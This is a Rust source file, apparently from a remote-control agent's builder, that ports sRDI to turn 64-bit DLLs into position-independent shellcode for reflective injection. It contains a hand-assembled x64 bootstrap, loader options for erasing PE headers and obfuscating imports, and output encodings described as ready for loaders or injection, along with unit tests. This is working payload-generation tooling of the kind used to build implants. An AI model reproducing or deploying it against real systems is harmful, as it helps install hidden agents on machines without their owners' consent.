// src/shellcode.rs
//
// PE (DLL) → position-independent shellcode conversion, sRDI-style.
//
// The output blob layout is:
//
//   ┌─────────────────────┬──────────────────┬─────────────┬───────────┐
//   │ bootstrap (69 bytes)│ RDI loader stub  │ raw DLL     │ user data │
//   └─────────────────────┴──────────────────┴─────────────┴───────────┘
//
// At runtime the bootstrap captures its own RIP, sets up the Win64
// fastcall arguments the loader stub expects, aligns the stack, and calls
// into the stub. The stub (see rdi_stub.rs) reflectively maps the DLL:
// section copy, base relocations, import resolution via PEB walk and
// ROR13 name hashing, then DllMain(DLL_PROCESS_ATTACH) and an optional
// hashed export call. Because the agent's client_dll spawns its runtime
// from DllMain, no export call is needed and the default hash 0x10
// ("no export") is correct for RCM agents.
//
// The conversion algorithm is a Rust port of sRDI's ConvertToShellcode
// (https://github.com/monoxgas/sRDI, BSD 3-Clause). Only 64-bit DLLs are
// supported — the project's Windows agents are built for
// x86_64-pc-windows-gnu, so a 32-bit path would be dead code.

use std::fmt;

use crate::rdi_stub::RDI_STUB_X64;

/// Hash value the RDI stub interprets as "do not call any export —
/// DllMain did all the work". Matches sRDI's convention.
pub const DEFAULT_FUNCTION_HASH: u32 = 0x10;

/// Exact size of the x64 bootstrap built below. The stub call inside the
/// bootstrap is RIP-relative, so a wrong size silently corrupts the jump
/// target — assert on it at construction time and in tests.
pub const BOOTSTRAP_SIZE_X64: usize = 69;

/// Length of the embedded x64 RDI loader stub in bytes.
pub const RDI_STUB_LEN: usize = RDI_STUB_X64.len();

// ── PE constants ────────────────────────────────────────────────────────────
const E_LFANEW_OFFSET: usize = 0x3C;
const PE_SIGNATURE: &[u8; 4] = b"PE\0\0";
const MACHINE_AMD64: u16 = 0x8664;
const OPTIONAL_MAGIC_PE32PLUS: u16 = 0x20B;
const IMAGE_FILE_DLL: u16 = 0x2000;

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ShellcodeError {
    TooSmall,
    BadDosMagic,
    BadPeSignature,
    NotAmd64(u16),
    NotPe32Plus(u16),
    NotADll,
    TruncatedHeaders,
}

impl fmt::Display for ShellcodeError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            ShellcodeError::TooSmall => write!(f, "file too small to be a PE"),
            ShellcodeError::BadDosMagic => write!(f, "missing MZ DOS magic"),
            ShellcodeError::BadPeSignature => write!(f, "missing PE\\0\\0 signature"),
            ShellcodeError::NotAmd64(m) => write!(
                f,
                "not a 64-bit PE (machine 0x{m:04X}); only x86_64 DLLs are supported"
            ),
            ShellcodeError::NotPe32Plus(m) => write!(
                f,
                "unexpected optional-header magic 0x{m:04X} (want PE32+)"
            ),
            ShellcodeError::NotADll => write!(
                f,
                "PE is not a DLL (IMAGE_FILE_DLL not set); build with --format dll semantics"
            ),
            ShellcodeError::TruncatedHeaders => write!(f, "truncated PE headers"),
        }
    }
}

impl std::error::Error for ShellcodeError {}

/// Options controlling the generated shellcode.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellcodeOptions {
    /// ROR13 hash of a DLL export to call after DllMain returns.
    /// `DEFAULT_FUNCTION_HASH` (0x10) means "no export call".
    pub function_hash: u32,
    /// Opaque blob appended after the DLL; a pointer + length is handed to
    /// the loader stub. sRDI's default placeholder is b"None".
    pub user_data: Vec<u8>,
    /// Loader flags (bit0: erase PE headers after load, bit1: obfuscate
    /// imports, bit2: pass shellcode base to export). 0 is a safe default.
    pub flags: u32,
}

impl Default for ShellcodeOptions {
    fn default() -> Self {
        ShellcodeOptions {
            function_hash: DEFAULT_FUNCTION_HASH,
            user_data: b"None".to_vec(),
            flags: 0,
        }
    }
}

fn read_u16_le(buf: &[u8], off: usize) -> Option<u16> {
    buf.get(off..off + 2).map(|b| u16::from_le_bytes([b[0], b[1]]))
}

fn read_u32_le(buf: &[u8], off: usize) -> Option<u32> {
    buf.get(off..off + 4)
        .map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
}

/// Validate that `pe` is a 64-bit Windows DLL with intact headers.
pub fn validate_x64_dll(pe: &[u8]) -> Result<(), ShellcodeError> {
    if pe.len() < E_LFANEW_OFFSET + 4 {
        return Err(ShellcodeError::TooSmall);
    }
    if &pe[0..2] != b"MZ" {
        return Err(ShellcodeError::BadDosMagic);
    }
    let pe_off = read_u32_le(pe, E_LFANEW_OFFSET).ok_or(ShellcodeError::TruncatedHeaders)? as usize;
    // Need: signature(4) + file header(20) + optional magic(2)
    if pe.len() < pe_off + 4 + 20 + 2 {
        return Err(ShellcodeError::TruncatedHeaders);
    }
    if &pe[pe_off..pe_off + 4] != PE_SIGNATURE {
        return Err(ShellcodeError::BadPeSignature);
    }
    let file_hdr = pe_off + 4;
    let machine = read_u16_le(pe, file_hdr).ok_or(ShellcodeError::TruncatedHeaders)?;
    if machine != MACHINE_AMD64 {
        return Err(ShellcodeError::NotAmd64(machine));
    }
    let characteristics = read_u16_le(pe, file_hdr + 18).ok_or(ShellcodeError::TruncatedHeaders)?;
    if characteristics & IMAGE_FILE_DLL == 0 {
        return Err(ShellcodeError::NotADll);
    }
    let opt_magic = read_u16_le(pe, file_hdr + 20).ok_or(ShellcodeError::TruncatedHeaders)?;
    if opt_magic != OPTIONAL_MAGIC_PE32PLUS {
        return Err(ShellcodeError::NotPe32Plus(opt_magic));
    }
    Ok(())
}

/// Convert a raw x64 DLL into position-independent shellcode.
///
/// Byte-for-byte compatible with sRDI's `ConvertToShellcode(dll, hash,
/// user_data, flags)` for 64-bit inputs.
pub fn convert_dll_to_shellcode(
    dll: &[u8],
    opts: &ShellcodeOptions,
) -> Result<Vec<u8>, ShellcodeError> {
    validate_x64_dll(dll)?;

    let mut b: Vec<u8> = Vec::with_capacity(
        BOOTSTRAP_SIZE_X64 + RDI_STUB_X64.len() + dll.len() + opts.user_data.len(),
    );

    // call $+5 — pushes RIP of the following instruction onto the stack
    b.extend_from_slice(&[0xE8, 0x00, 0x00, 0x00, 0x00]);

    // Offset from the pop below to the DLL image:
    //   remaining bootstrap bytes + loader stub
    let dll_offset = (BOOTSTRAP_SIZE_X64 - b.len() + RDI_STUB_X64.len()) as u32;
    let user_data_location = dll_offset + dll.len() as u32;

    b.push(0x59); // pop rcx — rcx = current RIP (shellcode base)

    b.extend_from_slice(&[0x49, 0x89, 0xC8]); // mov r8, rcx

    b.push(0xBA); // mov edx, <function hash>
    b.extend_from_slice(&opts.function_hash.to_le_bytes());

    b.extend_from_slice(&[0x49, 0x81, 0xC0]); // add r8, <user data location>
    b.extend_from_slice(&user_data_location.to_le_bytes());

    b.extend_from_slice(&[0x41, 0xB9]); // mov r9d, <user data length>
    b.extend_from_slice(&(opts.user_data.len() as u32).to_le_bytes());

    b.push(0x56); // push rsi — preserve
    b.extend_from_slice(&[0x48, 0x89, 0xE6]); // mov rsi, rsp
    b.extend_from_slice(&[0x48, 0x83, 0xE4, 0xF0]); // and rsp, -16
    b.extend_from_slice(&[0x48, 0x83, 0xEC, 0x30]); // sub rsp, 0x30 (shadow space + args)

    b.extend_from_slice(&[0x48, 0x89, 0x4C, 0x24, 0x28]); // mov [rsp+0x28], rcx (arg5: sc base)

    b.extend_from_slice(&[0x48, 0x81, 0xC1]); // add rcx, <dll offset> (arg1: dll ptr)
    b.extend_from_slice(&dll_offset.to_le_bytes());

    b.extend_from_slice(&[0xC7, 0x44, 0x24, 0x20]); // mov dword [rsp+0x20], <flags> (arg6)
    b.extend_from_slice(&opts.flags.to_le_bytes());

    b.push(0xE8); // call <RDI stub> — RIP-relative, target = BOOTSTRAP_SIZE_X64
    let rel = (BOOTSTRAP_SIZE_X64 as i32) - (b.len() as i32) - 4;
    b.extend_from_slice(&rel.to_le_bytes());

    b.extend_from_slice(&[0x48, 0x89, 0xF4]); // mov rsp, rsi
    b.push(0x5E); // pop rsi
    b.push(0xC3); // ret

    debug_assert_eq!(b.len(), BOOTSTRAP_SIZE_X64, "x64 bootstrap size drifted");

    b.extend_from_slice(RDI_STUB_X64);
    b.extend_from_slice(dll);
    b.extend_from_slice(&opts.user_data);
    Ok(b)
}

// ── Output encodings ────────────────────────────────────────────────────────

/// Output encodings supported by the builder's `--shellcode-output` flag.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ShellcodeEncoding {
    /// Raw .bin file, ready for loaders/injection.
    Raw,
    /// Single-line standard base64 (with padding).
    Base64,
    /// C/C++ source snippet: `unsigned char sc[] = {...}; unsigned int sc_len = N;`
    CArray,
    /// Lowercase hex string, no separators.
    Hex,
}

const B64_ALPHABET: &[u8; 64] =
    b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/// Standard-alphabet base64 with padding. Implemented locally so this
/// module stays std-only (and unit-testable without the dependency tree).
pub fn encode_base64(data: &[u8]) -> String {
    let mut out = String::with_capacity((data.len() + 2) / 3 * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = *chunk.get(1).unwrap_or(&0) as u32;
        let b2 = *chunk.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(B64_ALPHABET[(n >> 18) as usize & 63] as char);
        out.push(B64_ALPHABET[(n >> 12) as usize & 63] as char);
        out.push(if chunk.len() > 1 {
            B64_ALPHABET[(n >> 6) as usize & 63] as char
        } else {
            '='
        });
        out.push(if chunk.len() > 2 {
            B64_ALPHABET[n as usize & 63] as char
        } else {
            '='
        });
    }
    out
}

pub fn encode_hex(data: &[u8]) -> String {
    const HEX: &[u8; 16] = b"0123456789abcdef";
    let mut out = String::with_capacity(data.len() * 2);
    for &byte in data {
        out.push(HEX[(byte >> 4) as usize] as char);
        out.push(HEX[(byte & 0xF) as usize] as char);
    }
    out
}

pub fn encode_c_array(data: &[u8], name: &str) -> String {
    let mut out = String::with_capacity(data.len() * 6 + 128);
    out.push_str(&format!("unsigned char {name}[] = {{\n"));
    for chunk in data.chunks(12) {
        out.push_str("    ");
        for &byte in chunk {
            out.push_str(&format!("0x{byte:02X}, "));
        }
        out.push('\n');
    }
    out.push_str("};\n");
    out.push_str(&format!("unsigned int {name}_len = {};\n", data.len()));
    out
}

/// Render shellcode into the requested on-disk encoding.
pub fn encode_shellcode(data: &[u8], enc: ShellcodeEncoding, name: &str) -> Vec<u8> {
    match enc {
        ShellcodeEncoding::Raw => data.to_vec(),
        ShellcodeEncoding::Base64 => encode_base64(data).into_bytes(),
        ShellcodeEncoding::Hex => encode_hex(data).into_bytes(),
        ShellcodeEncoding::CArray => encode_c_array(data, name).into_bytes(),
    }
}

// ── Unit tests ──────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// Minimal structurally-valid x64 DLL header (512 bytes of mostly
    /// zeros — conversion never maps sections, it only ships the bytes).
    fn fake_dll(size: usize) -> Vec<u8> {
        let mut d = vec![0u8; size.max(512)];
        d[0] = b'M';
        d[1] = b'Z';
        let pe_off = 0x80usize;
        d[E_LFANEW_OFFSET..E_LFANEW_OFFSET + 4].copy_from_slice(&(pe_off as u32).to_le_bytes());
        d[pe_off..pe_off + 4].copy_from_slice(b"PE\0\0");
        let fh = pe_off + 4;
        d[fh..fh + 2].copy_from_slice(&MACHINE_AMD64.to_le_bytes());
        // Characteristics at file-header +18: DLL | executable | large-address-aware
        d[fh + 18..fh + 20].copy_from_slice(&(IMAGE_FILE_DLL | 0x0002 | 0x0020).to_le_bytes());
        d[fh + 20..fh + 22].copy_from_slice(&OPTIONAL_MAGIC_PE32PLUS.to_le_bytes());
        d
    }

    #[test]
    fn bootstrap_is_exactly_69_bytes() {
        let sc = convert_dll_to_shellcode(&fake_dll(1024), &ShellcodeOptions::default()).unwrap();
        // byte 69 must be the first byte of the RDI stub (mov rax, rsp)
        assert_eq!(&sc[BOOTSTRAP_SIZE_X64..BOOTSTRAP_SIZE_X64 + 3], &[0x48, 0x8B, 0xC4]);
    }

    #[test]
    fn layout_is_bootstrap_stub_dll_userdata() {
        let dll = fake_dll(1000);
        let opts = ShellcodeOptions {
            function_hash: 0xDEADBEEF,
            user_data: b"HELLO".to_vec(),
            flags: 5,
        };
        let sc = convert_dll_to_shellcode(&dll, &opts).unwrap();
        let stub_end = BOOTSTRAP_SIZE_X64 + RDI_STUB_X64.len();
        assert_eq!(sc.len(), stub_end + dll.len() + 5);
        assert_eq!(&sc[stub_end..stub_end + 2], b"MZ"); // DLL starts right after stub
        assert_eq!(&sc[sc.len() - 5..], b"HELLO"); // user data is the trailer
    }

    #[test]
    fn bootstrap_embeds_correct_immediates() {
        let dll = fake_dll(1000);
        let opts = ShellcodeOptions {
            function_hash: 0x41424344,
            user_data: vec![0u8; 7],
            flags: 3,
        };
        let sc = convert_dll_to_shellcode(&dll, &opts).unwrap();

        let dll_offset = (BOOTSTRAP_SIZE_X64 - 5 + RDI_STUB_X64.len()) as u32; // 2836
        let user_data_loc = dll_offset + dll.len() as u32;

        // mov edx, hash  (offset 9: opcode BA at 9, imm at 10)
        assert_eq!(sc[9], 0xBA);
        assert_eq!(read_u32_le(&sc, 10), Some(0x41424344));

        // add r8, user_data_loc (opcode at 14, imm at 17)
        assert_eq!(&sc[14..17], &[0x49, 0x81, 0xC0]);
        assert_eq!(read_u32_le(&sc, 17), Some(user_data_loc));

        // mov r9d, 7 (opcode at 21, imm at 23)
        assert_eq!(&sc[21..23], &[0x41, 0xB9]);
        assert_eq!(read_u32_le(&sc, 23), Some(7));

        // add rcx, dll_offset (opcode at 44, imm at 47)
        assert_eq!(&sc[44..47], &[0x48, 0x81, 0xC1]);
        assert_eq!(read_u32_le(&sc, 47), Some(dll_offset));

        // mov dword [rsp+0x20], flags (opcode at 51, imm at 55)
        assert_eq!(&sc[51..55], &[0xC7, 0x44, 0x24, 0x20]);
        assert_eq!(read_u32_le(&sc, 55), Some(3));

        // call stub: E8 at 59, rel32 at 60; target = 59+5+rel must be 69
        assert_eq!(sc[59], 0xE8);
        let rel = read_u32_le(&sc, 60).unwrap() as i32;
        assert_eq!(64 + rel, BOOTSTRAP_SIZE_X64 as i32);
    }

    #[test]
    fn rejects_garbage_and_wrong_arch() {
        assert_eq!(
            convert_dll_to_shellcode(b"short", &ShellcodeOptions::default()),
            Err(ShellcodeError::TooSmall)
        );

        let mut bad = fake_dll(512);
        bad[0] = b'X';
        assert_eq!(
            convert_dll_to_shellcode(&bad, &ShellcodeOptions::default()),
            Err(ShellcodeError::BadDosMagic)
        );

        let mut bad = fake_dll(512);
        bad[0x80] = b'X';
        assert_eq!(
            convert_dll_to_shellcode(&bad, &ShellcodeOptions::default()),
            Err(ShellcodeError::BadPeSignature)
        );

        // 32-bit machine
        let mut bad = fake_dll(512);
        bad[0x84..0x86].copy_from_slice(&0x014Cu16.to_le_bytes());
        assert_eq!(
            convert_dll_to_shellcode(&bad, &ShellcodeOptions::default()),
            Err(ShellcodeError::NotAmd64(0x014C))
        );

        // EXE (DLL bit cleared)
        let mut bad = fake_dll(512);
        bad[0x96..0x98].copy_from_slice(&0x0022u16.to_le_bytes());
        assert_eq!(
            convert_dll_to_shellcode(&bad, &ShellcodeOptions::default()),
            Err(ShellcodeError::NotADll)
        );

        // PE32 (not PE32+)
        let mut bad = fake_dll(512);
        bad[0x98..0x9A].copy_from_slice(&0x010Bu16.to_le_bytes());
        assert_eq!(
            convert_dll_to_shellcode(&bad, &ShellcodeOptions::default()),
            Err(ShellcodeError::NotPe32Plus(0x010B))
        );
    }

    #[test]
    fn base64_known_vectors() {
        assert_eq!(encode_base64(b""), "");
        assert_eq!(encode_base64(b"f"), "Zg==");
        assert_eq!(encode_base64(b"fo"), "Zm8=");
        assert_eq!(encode_base64(b"foo"), "Zm9v");
        assert_eq!(encode_base64(b"foob"), "Zm9vYg==");
        assert_eq!(encode_base64(b"fooba"), "Zm9vYmE=");
        assert_eq!(encode_base64(b"foobar"), "Zm9vYmFy");
    }

    #[test]
    fn hex_and_c_array_formats() {
        assert_eq!(encode_hex(&[0xDE, 0xAD, 0x00, 0xFF]), "dead00ff");
        let c = encode_c_array(&[0x41, 0x42], "sc");
        assert!(c.starts_with("unsigned char sc[] = {\n"));
        assert!(c.contains("0x41, 0x42,"));
        assert!(c.ends_with("unsigned int sc_len = 2;\n"));
    }
}
